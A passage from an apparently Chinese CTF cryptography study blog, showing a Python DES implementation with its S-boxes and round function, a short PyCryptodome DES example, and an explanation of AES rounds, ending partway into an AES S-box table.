<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># PC_1置换函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_1</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: key[x], __pc1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># PC_2置换函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_2</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: key[x], __pc2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取子钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sub_key</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    key = PC_1(key) <span class="comment"># PC-1置换</span></span><br><span class="line">    L, R = key[:<span class="number">28</span>], key[<span class="number">28</span>:] <span class="comment"># 分成两半</span></span><br><span class="line"></span><br><span class="line">    skeys = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]): <span class="comment"># 根据轮次左移</span></span><br><span class="line">            L = L[<span class="number">1</span>:] + L[:<span class="number">1</span>]</span><br><span class="line">            R = R[<span class="number">1</span>:] + R[:<span class="number">1</span>]</span><br><span class="line">        skeys.append(PC_2(L+R)) <span class="comment"># PC-2置换</span></span><br><span class="line">    <span class="keyword">return</span> skeys</span><br><span class="line"></span><br><span class="line">__expansion_table = [</span><br><span class="line"><span class="number">31</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,</span><br><span class="line"> <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line"><span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line"><span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line"><span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>,</span><br><span class="line"><span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">__sbox = [</span><br><span class="line"><span class="comment"># S1</span></span><br><span class="line">[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line"> <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S2</span></span><br><span class="line">[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line"> <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S3</span></span><br><span class="line">[<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S4</span></span><br><span class="line">[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S5</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line"> <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line"> <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S6</span></span><br><span class="line">[<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line"> <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line"> <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S7</span></span><br><span class="line">[<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line"> <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line"><span class="comment"># S8</span></span><br><span class="line">[<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>],</span><br><span class="line">]</span><br><span class="line">__p = [</span><br><span class="line"><span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>,</span><br><span class="line"><span class="number">27</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>,</span><br><span class="line"><span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>,</span><br><span class="line"><span class="number">23</span>,<span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line"><span class="number">3</span>, <span class="number">24</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EP</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>):  <span class="comment"># 扩展置换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: data[x], __expansion_table))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>):  <span class="comment"># P置换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: data[x], __p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">F</span>(<span class="params">index: <span class="built_in">int</span>, R: <span class="type">List</span>[<span class="built_in">int</span>], skeys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    index: 代表这是第几轮</span></span><br><span class="line"><span class="string">    R: 输入数据</span></span><br><span class="line"><span class="string">    skeys: 子密钥数组</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 右半部分扩展成48位</span></span><br><span class="line">    R = EP(R)  <span class="comment"># 扩展置换</span></span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, skeys[index]))  <span class="comment"># 异或</span></span><br><span class="line"></span><br><span class="line">    B = [R[:<span class="number">6</span>], R[<span class="number">6</span>:<span class="number">12</span>], R[<span class="number">12</span>:<span class="number">18</span>], R[<span class="number">18</span>:<span class="number">24</span>], R[<span class="number">24</span>:<span class="number">30</span>], R[<span class="number">30</span>:<span class="number">36</span>], R[<span class="number">36</span>:<span class="number">42</span>], R[<span class="number">42</span>:]]  <span class="comment"># 分成八份</span></span><br><span class="line"></span><br><span class="line">    Bn = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="comment">#  计算该使用S盒的行坐标和列坐标</span></span><br><span class="line">        row = (B[i][<span class="number">0</span>] &lt;&lt; <span class="number">1</span>) + B[i][<span class="number">5</span>]</span><br><span class="line">        col = (B[i][<span class="number">1</span>] &lt;&lt; <span class="number">3</span>) + (B[i][<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + (B[i][<span class="number">3</span>] &lt;&lt; <span class="number">1</span>) + B[i][<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        sb = __sbox[i][(row &lt;&lt; <span class="number">4</span>) + col]</span><br><span class="line"></span><br><span class="line">        Bn[pos + <span class="number">0</span>] = (sb &amp; <span class="number">8</span>) &gt;&gt; <span class="number">3</span>  <span class="comment"># 四位输出</span></span><br><span class="line">        Bn[pos + <span class="number">1</span>] = (sb &amp; <span class="number">4</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">        Bn[pos + <span class="number">2</span>] = (sb &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">        Bn[pos + <span class="number">3</span>] = (sb &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        pos += <span class="number">4</span></span><br><span class="line">    R = P(Bn)</span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line">_FP = [</span><br><span class="line"><span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line"><span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line"><span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line"><span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line"><span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line"><span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line"><span class="number">32</span>,  <span class="number">0</span>, <span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆置换，相对于初始置换的逆操作，将数据放回原位</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FP</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: plain[x], _FP))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line">plain = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转为二进制数组</span></span><br><span class="line">key = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> key])</span><br><span class="line">plain = reduce(add, [<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> plain])</span><br><span class="line">skeys = get_sub_key(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化置换</span></span><br><span class="line">block = IP(plain)</span><br><span class="line"></span><br><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tpR = R[:]</span><br><span class="line">    R = F(i, R, skeys)</span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    L = tpR</span><br><span class="line"><span class="comment"># 合并左右部分</span></span><br><span class="line">block = R + L</span><br><span class="line"><span class="comment"># 逆初始化操作</span></span><br><span class="line">block = FP(block)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">enc = <span class="built_in">bytes</span>([<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,block[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>])),<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><h3 id="封装库实现"><a href="#封装库实现" class="headerlink" title="封装库实现"></a>封装库实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">des = DES.new(<span class="string">b&#x27;12345678&#x27;</span>, DES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(des.encrypt(<span class="string">b&#x27;12345678&#x27;</span>))</span><br><span class="line">m = des.encrypt(<span class="string">b&#x27;12345678&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(des.decrypt(m))</span><br></pre></td></tr></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>输入：128 比特。</li><li>输出：128 比特。</li><li>SPN 网络结构。</li></ol><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/f60151970f.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/f60151970f.png"  class="" lazyload></a><h3 id="与DES的注意点"><a href="#与DES的注意点" class="headerlink" title="与DES的注意点"></a>与DES的注意点</h3><ol><li>每一刻从64位变成128位</li><li>AES采用的的SPN网络结构与Feistel相比，可以加密整个块，并且解密必须是对加密的逆运算</li><li>SPN全称为<code>Substitution-permutation network</code>即代换-置换网络，简单的说就是会对块进行替换，置换等多重迭代操作。</li></ol><h3 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h3><ol><li><strong>AddRoundKey轮密钥加</strong><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230802155225058.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230802155225058.png"  class="" lazyload></a></li><li><strong>SubBytes字节替换</strong><br>这里引入一个S盒，然后进行S盒替换</li><li><strong>ShiftRows行位移变换</strong><br>这也是一次扩散处理，达到雪崩效应（雪崩效应是指当输入发生最微小的改变（例如，反转一个二进制位）时，也会导致输出的不可区分性改变，即扩大错误防止攻击者找到不同明密文之间的关系）。</li><li><strong>MixColumns列混合变换</strong><br>也是扩散操作</li><li><strong>子密钥生成</strong></li></ol><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">r_con = (<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>,<span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>)</span><br><span class="line">s_box = (</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span 